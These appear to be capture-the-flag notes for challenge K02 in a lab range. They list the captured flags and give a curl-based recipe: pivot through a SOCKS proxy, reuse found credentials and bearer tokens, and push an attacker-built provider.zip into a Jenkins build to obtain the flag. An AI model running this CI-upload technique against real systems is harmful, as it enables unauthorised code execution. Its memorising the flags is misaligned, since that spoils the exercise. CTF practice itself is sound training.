# K02 notes (final)

## Flags (all submitted, all correct)
- K02.1 FLAG{7db9f86b38c288ab}  <- Jenkins fieldlink-report #1842 consoleText
- K02.2 FLAG{ad920ac857c12cd3}  <- reports/REVNOTE-1842.json (review_token / flag)
- K02.3 FLAG{12791115ad005ed7}  <- support handover after provider.zip accepted
                                   (GET https://support.keplerops.test:8443/api/handovers/current,
                                    schema fieldkest.support-handover/v1, state success,
                                    job_id JOB-BA11FC0CCB19)

## Working recipe (from the range box, through SOCKS5 pivot)
P="--socks5-hostname 127.0.0.1:1080"; CA=/tmp/keplerca.crt (base64 of /home/kali/ctf/ca.crt)
AUTH="rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo"
BT="fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b"

1) fixture: GET $B/raw/fixtures/report-crr-og2.json?ref=fk-test-6d1e9f7
   B=https://source.keplerops.test/api/v1/repos/fieldkest/fieldlink-connector
   532 bytes, sha256 da511020fa2f2e23ec74ea3e8e2f8e19452ae90bcdd32fea2e0602b8573d6564
2) provider.py: render_report(fixture) -> copy of fixture with new
   assessment.rating="callback-review-required" + summary (immutables untouched)
3) zip -j style: entries provider.py + fixture.json at root (use python zipfile)
4) Jenkins:
   CRUMB=$(curl -c cj -u $AUTH .../crumbIssuer/api/json | jq -r .crumb)
   curl -u $AUTH -b cj -c cj -H "Jenkins-Crumb: $CRUMB" -F provider.zip=@provider.zip \
        https://ci.keplerops.test/job/fieldlink-report-review/buildWithParameters
   -> 201 Location /queue/item/6 -> build #1 SUCCESS
   console: Report accepted: JOB-BA11FC0CCB19 ; Report SHA-256 93b11cb4...
5) handover: GET https://support.keplerops.test:8443/api/handovers/current
   (bearer works with/without auth header; returns flag when state=success)

## Also seen (NOT K02, do not resubmit)
- K10.1 flag FLAG{e79c34cd2ef12e6e} : preview association?source=SUP-K-2841
- retention flag FLAG{408710d448134ab5} : osTicket SUP-2841 "Retention reference"
- FLAG{2b66416be507ee69} : rowan-dev local helper 127.0.0.1:8701 inspection-summary
  (sample FK-SAMPLE-017) — inspection challenge
- SUP-2841 also has K18 restricted support-note draft (staff note-preview workflow)
- Review run BLD-REL-742 (fieldkest/release-signer-history, dossier artifact) and
  BLD-REC-021 (404) for lineage lanes.

## Useful service notes
- review.keplerops.test exact-run artifacts:
  GET /api/runs/BLD-1842 -> retained_artifacts with sha256; note there is sanitized
  (no token) while Jenkins artifact/workspace copies carry the token.
- preview.keplerops.test PRV-771 (case CAS-MAYA-2841, source SUP-K-2841) state pending;
  /prepare needs action_nonce (K10/K12 territory).
- Jenkins crumb must be fetched with -c cj and used with -b cj or you get 403.
